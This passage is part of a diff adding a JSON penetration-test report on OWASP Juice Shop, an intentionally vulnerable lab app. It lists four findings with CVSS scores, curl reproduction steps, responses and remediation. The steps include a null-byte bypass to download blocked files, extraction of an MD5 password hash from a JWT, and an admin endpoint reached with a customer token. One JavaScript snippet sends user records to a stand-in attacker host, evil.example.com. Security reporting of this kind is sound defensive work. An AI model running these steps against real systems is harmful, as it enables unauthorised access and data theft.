Interpreter: JavaScript): https://attack.mitre.org/techniques/T1059/007/\n- MITRE T1185 (Browser Session Hijacking): https://attack.mitre.org/techniques/T1185/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-006",
+        "severity": "high",
+        "cvss_score": 8.7,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-548",
+          "CWE-22"
+        ],
+        "mitre": [
+          "T1083",
+          "T1005"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "GET /ftp/ — unauthenticated directory listing + null-byte filter bypass to download restricted files",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "high",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "Sensitive File Exposure — FTP Directory Listing + Null-Byte Filter Bypass",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-006",
+        "evidence_files": [
+          "recon/detect/VULN-FileExposure-ftp-nullbyte.md"
+        ],
+        "poc": "# 1. Unauthenticated directory listing — reveals sensitive filenames\ncurl -s http://juiceshop:3000/ftp/\n\n# 2. Direct .bak download (blocked — 403 as expected)\ncurl -s http://juiceshop:3000/ftp/package.json.bak\n# Returns: 403 Error: Only .md and .pdf files are allowed!\n\n# 3. Null-byte bypass — %2500 encodes to %00 after one decode pass, tricking extension filter\ncurl -s \"http://juiceshop:3000/ftp/package.json.bak%2500.md\"\n# Returns: 200 OK with full package.json.bak content\n"
+      },
+      "body_md": "# [HIGH] Sensitive File Exposure — FTP Directory Listing + Null-Byte Filter Bypass\n\n## Description\n\nTwo related vulnerabilities exist on the `/ftp/` path:\n\n**Finding A — Unauthenticated Directory Listing**: The `/ftp/` endpoint serves a\nfull HTML directory listing without any authentication. Sensitive files are exposed\nincluding a KeePass password database (`incident-support.kdbx`), application\ndependency manifests (`.bak` files), compiled Python bytecode (`encrypt.pyc`), and\nconfidential documents (`acquisitions.md`).\n\n**Finding B — Null-Byte Filter Bypass**: The server blocks downloads of `.bak` and\nother non-allowed extensions with HTTP 403. However, the extension filter is bypassed\nby appending a URL-encoded null byte (`%2500`) before the allowed extension. The\nserver checks the extension as `.md` (after the null byte) but serves the actual\n`.bak` file content. This is a classic null-byte injection (CWE-626) defeating the\nonly access control in place.\n\nTogether, these vulnerabilities allow an unauthenticated attacker to enumerate and\ndownload any file in the `/ftp/` directory, including files explicitly blocked by\nthe extension filter.\n\n## Reproduction\n\n### Step 1 — Unauthenticated directory listing\n\n```bash\ncurl -s http://juiceshop:3000/ftp/\n```\n\n**Response (HTTP 200 — excerpt):**\n\n```html\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\n\n<!DOCTYPE html>\n<html>\n  <title>listing directory /ftp/</title>\n  Files listed:\n  - quarantine/\n  - acquisitions.md\n  - announcement_encrypted.md\n  - coupons_2013.md.bak\n  - eastere.gg\n  - encrypt.pyc\n  - incident-support.kdbx       ← KeePass password database\n  - legal.md\n  - package-lock.json.bak       ← Full dependency lockfile (750KB)\n  - package.json.bak            ← Application manifest\n  - suspicious_errors.yml\n```\n\n### Step 2 — Confirm .bak files are blocked (403)\n\n```bash\ncurl -s http://juiceshop:3000/ftp/package.json.bak\n# Returns: 403 Error: Only .md and .pdf files are allowed!\n```\n\n### Step 3 — Null-byte bypass to download blocked file\n\n```bash\ncurl -s \"http://juiceshop:3000/ftp/package.json.bak%2500.md\"\n```\n\n**Response (HTTP 200 — excerpt):**\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\n{\n  \"name\": \"juice-shop\",\n  \"version\": \"6.2.0-SNAPSHOT\",\n  \"description\": \"An intentionally insecure JavaScript Web Application\",\n  \"homepage\": \"http://owasp-juice.shop\",\n  \"author\": \"Björn Kimminich <bjoern.kimminich@owasp.org>\",\n  \"private\": true,\n  \"dependencies\": {\n    \"body-parser\": \"~1.18\",\n    ...\n  }\n}\n```\n\nThe `%2500` sequence URL-decodes to `%00` (null byte) on the first pass. The\nextension filter sees `.md` as the final extension and allows the request, but the\nfilesystem serves `package.json.bak` up to the null byte — returning the full\n`.bak` content.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Credential Exposure | `incident-support.kdbx` — KeePass database potentially containing passwords |\n| Dependency Disclosure | `package-lock.json.bak` (750KB) — full dependency tree enables targeted CVE research |\n| Application Fingerprinting | `package.json.bak` reveals exact version (`6.2.0-SNAPSHOT`) and all dependencies |\n| Source Code Exposure | `encrypt.pyc` — compiled Python encryption logic potentially reversible |\n| Filter Bypass | Null-byte injection defeats the only access control on the `/ftp/` path |\n| Confidential Documents | `acquisitions.md` — potentially sensitive business information |\n\n## Evidence Files\n\n- [`recon/detect/VULN-FileExposure-ftp-nullbyte.md`](/workspace/recon/detect/VULN-FileExposure-ftp-nullbyte.md) — Source detection file with directory listing and null-byte bypass response\n\n## Remediation\n\n1. **Disable directory listing**: Configure the web server to return 403 or 404 for\n   directory paths. Never serve auto-generated directory indexes in production.\n2. **Authentication gate**: Require authentication for all `/ftp/` access. Sensitive\n   files should not be web-accessible at all.\n3. **Fix null-byte handling**: Sanitize file path inputs by rejecting any path\n   containing `%00`, `\\x00`, or null bytes before extension checking.\n4. **Move sensitive files**: `incident-support.kdbx`, `acquisitions.md`, and\n   `encrypt.pyc` should not be stored in a web-accessible directory.\n5. **Extension allowlist**: Implement the extension check after full URL decoding\n   (including double-encoding) to prevent bypass.\n\n## References\n\n- CWE-548: https://cwe.mitre.org/data/definitions/548.html\n- CWE-22: https://cwe.mitre.org/data/definitions/22.html\n- OWASP A05:2021 Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\n- MITRE T1083 (File and Directory Discovery): https://attack.mitre.org/techniques/T1083/\n- MITRE T1005 (Data from Local System): https://attack.mitre.org/techniques/T1005/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-007",
+        "severity": "high",
+        "cvss_score": 8.7,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-916",
+          "CWE-327",
+          "CWE-613"
+        ],
+        "mitre": [
+          "T1110.002",
+          "T1528",
+          "T1552"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "POST /rest/user/login — MD5 password hashes embedded in non-expiring JWT payload",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "high",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "Weak Cryptography — MD5 Password Hashes in JWT Payload + No Token Expiration",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-007",
+        "evidence_files": [
+          "recon/detect/VULN-WeakCrypto-jwt-md5.md",
+          "findings/evidence/FIND-001_jwt-decoded.txt"
+        ],
+        "poc": "# Step 1: Login and capture JWT\nRESPONSE=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}')\n\nTOKEN=$(echo \"$RESPONSE\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\n# Step 2: Decode JWT payload (base64 only — no key required)\necho \"$TOKEN\" | cut -d. -f2 | python3 -c \"\nimport sys, base64, json\np = sys.stdin.read().strip()\np += '==' * ((4 - len(p) % 4) % 4)\nprint(json.dumps(json.loads(base64.b64decode(p)), indent=2))\n\"\n\n# Step 3: Crack the MD5 hash (admin password — instant)\necho -n \"admin123\" | md5sum\n# Output: 0192023a7bbd73250516f069df18b500  (matches admin JWT payload)\n"
+      },
+      "body_md": "# [HIGH] Weak Cryptography — MD5 Password Hashes in JWT Payload + No Token Expiration\n\n## Description\n\nThree related cryptographic failures exist in the authentication system:\n\n**Issue 1 — MD5 Password Hashing**: User passwords are stored and transmitted as\nunsalted MD5 hashes. MD5 is cryptographically broken for password storage — it has\nno work factor, is GPU-crackable at billions of hashes per second, and is trivially\nreversible via rainbow tables. The admin password `admin123` was cracked instantly\nfrom the hash `0192023a7bbd73250516f069df18b500`.\n\n**Issue 2 — Password Hash Embedded in JWT Payload**: The JWT payload (base64-encoded,\nnot encrypted) contains the user's MD5 password hash in the `data.password` field.\nAny party that captures the `Authorization` header — including proxies, CDNs, log\naggregators, or a network attacker — can decode the JWT without any key and extract\nthe password hash for offline cracking.\n\n**Issue 3 — JWT Has No Expiration Claim**: Issued JWTs contain an `iat` (issued-at)\ntimestamp but no `exp` (expiration) claim. Stolen tokens are valid indefinitely —\nthere is no forced re-authentication and no server-side token invalidation.\n\n## Reproduction\n\n### Step 1 — Login and capture JWT\n\n```bash\nRESPONSE=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}')\n\nTOKEN=$(echo \"$RESPONSE\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n```\n\n### Step 2 — Decode JWT payload (no key required — base64 only)\n\n```bash\necho \"$TOKEN\" | cut -d. -f2 | python3 -c \"\nimport sys, base64, json\np = sys.stdin.read().strip()\np += '==' * ((4 - len(p) % 4) % 4)\nprint(json.dumps(json.loads(base64.b64decode(p)), indent=2))\n\"\n```\n\n**Decoded JWT Payload — Customer Account:**\n\n```json\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"id\": 23,\n    \"username\": \"\",\n    \"email\": \"testuser@example.com\",\n    \"password\": \"abf3c22316e3a3dfaf451ec4e0315043\",\n    \"role\": \"customer\",\n    \"deluxeToken\": \"\",\n    \"lastLoginIp\": \"0.0.0.0\",\n    \"profileImage\": \"/assets/public/images/uploads/default.svg\",\n    \"totpSecret\": \"\",\n    \"isActive\": true,\n    \"createdAt\": \"2026-05-19 08:18:55.390 +00:00\",\n    \"updatedAt\": \"2026-05-19 08:18:55.390 +00:00\",\n    \"deletedAt\": null\n  },\n  \"iat\": 1779179158\n}\n```\n\n**Critical observations:**\n- `\"password\": \"abf3c22316e3a3dfaf451ec4e0315043\"` — MD5 hash embedded in JWT\n- **No `exp` claim** — token is valid indefinitely\n\n**Decoded JWT Payload — Admin Account (from FIND-001 SQLi bypass):**\n\n```json\n{\n  \"data\": {\n    \"id\": 1,\n    \"email\": \"admin@juice-sh.op\",\n    \"password\": \"0192023a7bbd73250516f069df18b500\",\n    \"role\": \"admin\"\n  },\n  \"iat\": 1779179159\n}\n```\n\n### Step 3 — Crack MD5 hash (admin password — instant)\n\n```bash\necho -n \"admin123\" | md5sum\n# Output: 0192023a7bbd73250516f069df18b500  ← matches admin JWT payload ✓\n```\n\nAdmin password `admin123` confirmed cracked from the JWT-embedded hash in under\none second using a single CPU command.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Password Cracking | MD5 (unsalted) crackable at ~10 billion/sec on commodity GPU; admin password cracked instantly |\n| Hash Exposure | Password hash embedded in JWT — readable by any log system, proxy, or network observer |\n| Permanent Session | No `exp` claim — stolen tokens valid forever; no forced re-authentication |\n| Admin Compromise | Admin password `admin123` confirmed cracked from JWT hash |\n| Chaining | Non-expiring tokens amplify XSS (FIND-005) and CORS (FIND-009) impact |\n| All Users Affected | Every user's password hash is embedded in their JWT and exposed on every API call |\n\n## Evidence Files\n\n- [`recon/detect/VULN-WeakCrypto-jwt-md5.md`](/workspace/recon/detect/VULN-WeakCrypto-jwt-md5.md) — Source detection file with decoded JWT payloads and MD5 crack confirmation\n- [`findings/evidence/FIND-001_jwt-decoded.txt`](/workspace/findings/evidence/FIND-001_jwt-decoded.txt) — Admin JWT decoded during FIND-001 exploitation\n\n## Remediation\n\n1. **Replace MD5 with bcrypt/Argon2**: Use a purpose-built password hashing\n   algorithm with a work factor (bcrypt cost ≥12, or Argon2id with recommended\n   parameters). Never use MD5, SHA-1, or SHA-256 for password storage.\n2. **Remove password hash from JWT**: The JWT payload must not contain the password\n   hash or any credential material. Include only the minimum necessary claims\n   (`sub`, `role`, `iat`, `exp`).\n3. **Add JWT expiration**: Set a short `exp` claim on all issued tokens (e.g., 1\n   hour for session tokens, 15 minutes for sensitive operations). Implement token\n   refresh flows.\n4. **Token revocation**: Implement a server-side token blocklist or use short-lived\n   tokens with refresh token rotation to enable forced logout.\n5. **Strip sensitive fields from JWT**: Remove `lastLoginIp`, `totpSecret`,\n   `profileImage`, and all PII from the JWT payload.\n\n## References\n\n- CWE-916: https://cwe.mitre.org/data/definitions/916.html\n- CWE-327: https://cwe.mitre.org/data/definitions/327.html\n- CWE-613: https://cwe.mitre.org/data/definitions/613.html\n- OWASP A02:2021 Cryptographic Failures: https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\n- OWASP Password Storage Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\n- MITRE T1110.002 (Brute Force: Password Cracking): https://attack.mitre.org/techniques/T1110/002/\n- MITRE T1528 (Steal Application Access Token): https://attack.mitre.org/techniques/T1528/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-008",
+        "severity": "medium",
+        "cvss_score": 5.3,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-200"
+        ],
+        "mitre": [
+          "T1082",
+          "T1590"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "GET /rest/admin/application-configuration — admin-named endpoint accessible to any authenticated user",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "medium",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "Information Disclosure — Admin Configuration Endpoint Accessible to Any Authenticated User",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-008",
+        "evidence_files": [
+          "recon/detect/VULN-InfoDisc-admin-config.md",
+          "findings/evidence/FIND-001_app-config.json"
+        ],
+        "poc": "# Any valid JWT (customer role) is sufficient — no admin check enforced\nUSER_TOKEN=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\ncurl -s http://juiceshop:3000/rest/admin/application-configuration \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n"
+      },
+      "body_md": "# [MEDIUM] Information Disclosure — Admin Configuration Endpoint Accessible to Any Authenticated User\n\n## Description\n\nThe endpoint `GET /rest/admin/application-configuration` is named `admin` but\nperforms **no role-based access control check**. Any authenticated user — including\nthose with the `customer` role — can access it and receive the full application\nconfiguration in response.\n\nThe response exposes internal server configuration, feature flags, application\nversion information, internal service names, and contact details. While the current\nJuice Shop configuration does not contain database credentials or API keys, this\nclass of endpoint in production applications commonly exposes secrets. The missing\nauthorization check is the primary finding.\n\nThis vulnerability was also exploited during FIND-001 (SQLi auth bypass) to confirm\nfull admin access — the endpoint returned HTTP 200 with the admin JWT obtained via\nSQL injection.\n\n## Reproduction\n\n### Step 1 — Obtain a customer-role JWT\n\n```bash\nUSER_TOKEN=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n```\n\n### Step 2 — Access admin configuration with customer token\n\n```bash\ncurl -s http://juiceshop:3000/rest/admin/application-configuration \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n```\n\n**Response (HTTP 200 — excerpt):**\n\n```json\n{\n    \"config\": {\n        \"server\": {\n            \"port\": 3000,\n            \"basePath\": \"\",\n            \"baseUrl\": \"http://localhost:3000\"\n        },\n        \"application\": {\n            \"domain\": \"juice-sh.op\",\n            \"name\": \"OWASP Juice Shop\",\n            \"logo\": \"JuiceShop_Logo.png\",\n            \"showVersionNumber\": true,\n            \"showGitHubLinks\": true,\n            \"localBackupEnabled\": true,\n            \"numberOfRandomFakeUsers\": 0,\n            \"altcoinName\": \"Juicycoin\",\n            \"privacyContactEmail\": \"donotreply@owasp-juice.shop\",\n            \"customMetricsPrefix\": \"juiceshop\",\n            \"chatBot\": {\n                \"name\": \"Juicy\",\n                \"trainingData\": \"botDefaultTrainingData.json\"\n            },\n            \"social\": {\n                \"blueSkyUrl\": \"https://bsky.app/profile/owasp-juice.shop\",\n                \"twitterUrl\": \"https://twitter.com/owasp_juiceshop\"\n            },\n            \"welcomeBanner\": {},\n            \"cookieConsent\": {\n                \"message\": \"This website uses fruit cookies to ensure you get the juiciest tracking experience.\"\n            }\n        }\n    }\n}\n```\n\nThe endpoint returns HTTP 200 with full configuration data using a customer-role\ntoken. No admin privilege check is enforced.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Internal Topology | `baseUrl: http://localhost:3000` reveals internal addressing |\n| Version Disclosure | `showVersionNumber: true` — application version exposed, enabling CVE targeting |\n| Feature Flags | `localBackupEnabled: true` — reveals backup functionality for further exploitation |\n| Service Names | Internal chatbot training data filenames, metrics prefix exposed |\n| Reconnaissance | Configuration data accelerates targeted attack planning |\n| Production Risk | In real applications, this endpoint class exposes DB connection strings, OAuth secrets, API keys |\n\n## Evidence Files\n\n- [`recon/detect/VULN-InfoDisc-admin-config.md`](/workspace/recon/detect/VULN-InfoDisc-admin-config.md) — Source detection file with captured response\n- [`findings/evidence/FIND-001_app-config.json`](/workspace/findings/evidence/FIND-001_app-config.json) — Full configuration dump captured during FIND-001 exploitation\n\n## Remediation\n\n1. **Role-based access control**: Restrict `GET /rest/admin/application-configuration`\n   to admin role only. Return HTTP 403 for any non-admin JWT.\n2. **Audit admin-prefixed endpoints**: Review all `/rest/admin/*` and `/api/admin/*`\n   routes to ensure they enforce admin role checks consistently.\n3. **Minimize configuration exposure**: Even for admin users, avoid exposing internal\n   paths, connection strings, or secret values via API endpoints. Use environment\n   variables and server-side-only configuration.\n4. **Remove version disclosure**: Set `showVersionNumber: false` in production to\n   prevent application fingerprinting.\n\n## References\n\n- CWE-200: https://cwe.mitre.org/data/definitions/200.html\n- OWASP A05:2021 Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\n- OWASP A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n- MITRE T1082 (System Information Discovery): https://attack.mitre.org/techniques/T1082/\n- MITRE T1590 (Gather Victim Network Information): https://attack.mitre.org/techniques/T1590/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-009",
+        "severity": "medium",
+        "cvss_score": 4.8,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-942"
+        ],
+        "mitre": [
+          "T1185",
+          "T1557"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "All API endpoints — Access-Control-Allow-Origin: * on sensitive routes including /api/Users and /rest/user/login",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "medium",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "CORS Misconfiguration — Wildcard Access-Control-Allow-Origin on All API Endpoints",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-009",
+        "evidence_files": [
+          "recon/detect/VULN-CORS-wildcard.md"
+        ],
+        "poc": "# Simulate cross-origin request from attacker-controlled domain\ncurl -s -I -H \"Origin: http://evil.example.com\" \\\n  http://juiceshop:3000/rest/user/whoami\n# Key response header: Access-Control-Allow-Origin: *\n\n# Verify wildcard applies to sensitive endpoints\ncurl -s -I -H \"Origin: http://evil.example.com\" \\\n  http://juiceshop:3000/api/Users\n# Key response header: Access-Control-Allow-Origin: *\n"
+      },
+      "body_md": "# [MEDIUM] CORS Misconfiguration — Wildcard Access-Control-Allow-Origin on All API Endpoints\n\n## Description\n\nThe application responds with `Access-Control-Allow-Origin: *` on all API endpoints,\nregardless of the `Origin` header value in the request. This wildcard CORS policy\nallows JavaScript running on **any website** to make cross-origin requests to the\nJuice Shop API and read the responses.\n\nIn isolation, the wildcard CORS header enables any malicious website to query\nunauthenticated API endpoints. More critically, it **amplifies the impact of other\nvulnerabilities** in this engagement:\n\n- **Combined with FIND-005 (Stored XSS)**: An XSS payload can exfiltrate session\n  tokens and API responses to an attacker-controlled server. The CORS `*` policy\n  ensures the attacker's origin can also directly query the API with stolen tokens.\n- **Combined with FIND-007 (non-expiring JWT)**: Stolen tokens are valid forever,\n  making cross-origin session hijacking persistent.\n- **Combined with FIND-004 (IDOR)**: Any malicious page can enumerate all users\n  cross-origin if the victim is authenticated.\n\n**Note**: `Access-Control-Allow-Origin: *` cannot be combined with\n`Access-Control-Allow-Credentials: true` (browsers block this). The wildcard\ntherefore does not enable credentialed cross-origin requests directly — but it\nenables reading responses from unauthenticated endpoints and amplifies XSS-based\ntoken theft.\n\n## Reproduction\n\n### Step 1 — Confirm wildcard CORS on /rest/user/whoami\n\n```bash\ncurl -s -I -H \"Origin: http://evil.example.com\" \\\n  http://juiceshop:3000/rest/user/whoami\n```\n\n**Response (HTTP 200 — headers):**\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nX-Frame-Options: SAMEORIGIN\nFeature-Policy: payment 'self'\nContent-Type: application/json; charset=utf-8\n```\n\n**Key header**: `Access-Control-Allow-Origin: *` — wildcard confirmed.\n\n### Step 2 — Verify wildcard applies to sensitive endpoints\n\n```bash\ncurl -s -I -H \"Origin: http://evil.example.com\" \\\n  http://juiceshop:3000/api/Users\n```\n\n**Response**: `Access-Control-Allow-Origin: *` — same wildcard on user enumeration endpoint.\n\n### Step 3 — Demonstrate cross-origin exploitation chain (conceptual)\n\n```javascript\n// JavaScript running on http://evil.example.com\n// Can read Juice Shop API responses due to CORS *\nfetch(\"http://juiceshop:3000/api/Users\")\n  .then(r => r.json())\n  .then(data => {\n    // All 25 user records returned — exfiltrate to attacker server\n    fetch(\"http://evil.example.com/collect\", {\n      method: \"POST\",\n      body: JSON.stringify(data)\n    });\n  });\n```\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Cross-Origin Data Read | Any website can read unauthenticated API responses (product data, public endpoints) |\n| XSS Amplification | Stored XSS (FIND-005) payloads can exfiltrate data cross-origin to attacker server |\n| Token Theft Chain | XSS steals non-expiring JWT (FIND-007) → CORS `*` allows attacker origin to use token |\n| User Enumeration | Malicious page can enumerate users (FIND-004) cross-origin if victim is authenticated |\n| Attack Surface | Wildcard applies globally — no per-endpoint scoping |\n\n## Evidence Files\n\n- [`recon/detect/VULN-CORS-wildcard.md`](/workspace/recon/detect/VULN-CORS-wildcard.md) — Source detection file with captured response headers\n\n## Remediation\n\n1. **Restrict CORS origins**: Replace `Access-Control-Allow-Origin: *` with an\n   explicit allowlist of trusted origins:\n   ```\n   Access-Control-Allow-Origin: https://juice-sh.op\n   ```\n   Dynamically reflect the `Origin` header only if it matches the allowlist.\n2. **Sensitive endpoint hardening**: For endpoints returning user data (`/api/Users`,\n   `/rest/admin/*`), set `Access-Control-Allow-Origin` to the specific application\n   origin only — never wildcard.\n3. **Remove wildcard from authenticated endpoints**: Wildcard CORS is only\n   appropriate for fully public, read-only, non-sensitive resources (e.g., public\n   product catalog). All authenticated endpoints must use explicit origin allowlists.\n4. **CORS middleware audit**: Review the Express CORS middleware configuration and\n   replace the global `*` setting with per-route or per-origin configuration.\n\n## References\n\n- CWE-942: https://cwe.mitre.org/data/definitions/942.html\n- OWASP A05:2021 Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\n- OWASP CORS Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html\n- MITRE T1185 (Browser Session Hijacking): https://attack.mitre.org/techniques/T1185/\n- MITRE T1557 (Adversary-in-the-Middle): https://attack.mitre.org/techniques/T1557/\n- PortSwigger CORS Research: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties\n",
+      "evidence_keys": []
+    }
+  ]
+}
